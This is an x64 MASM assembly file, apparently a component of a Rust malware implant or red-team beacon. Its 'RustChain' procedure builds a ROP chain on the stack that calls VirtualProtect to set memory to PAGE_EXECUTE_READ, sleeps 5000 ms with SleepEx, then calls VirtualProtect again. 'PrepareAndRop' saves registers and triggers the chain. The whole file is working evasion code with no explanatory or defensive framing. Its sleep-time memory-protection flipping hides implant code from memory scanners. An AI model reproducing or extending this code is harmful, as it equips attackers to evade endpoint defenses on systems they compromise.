.code

    RustChain PROC
        
        push 1
        push 2
        push 3
        push QWORD PTR [rbp + 50h] ; gadget4
        push QWORD PTR [rbp + 30h] ; VirtualProtect

        push r11
        push r10
        push r9
        push QWORD PTR [rbp + 50h] ; gadget4

        push 20h ; PAGE_EXECUTE_READ
        push QWORD PTR [rbp + 48h] ; gadget3

        push r11
        push rdx
        push QWORD PTR [rbp + 40h] ; gadget2

        push rcx
        push QWORD PTR [rbp + 38h] ; gadget1

        push 4
        push 5
        push 6
        push 7
        push 8
        push QWORD PTR [rbp + 58h] ; gadget5

        push QWORD PTR [rbp + 60h] ; SleepEx
        push 1388h ; 5000 miliseconds
        push QWORD PTR [rbp + 38h] ; gadget1

        push 9
        push 10
        push 11
        push QWORD PTR [rbp + 50h] ; gadget4
        push QWORD PTR [rbp + 30h] ; VirtualProtect

        ret

    RustChain ENDP

    PrepareAndRop PROC
        push rbp
        mov rbp, rsp

        push rbx
        push rdi
        push rsi
        push r12
        push r13
        push r14
        push r15

        call RustChain

        pop r15
        pop r14
        pop r13
        pop r12
        pop rsi
        pop rdi
        pop rbx

        mov rsp, rbp
        pop rbp
        ret
    PrepareAndRop ENDP

end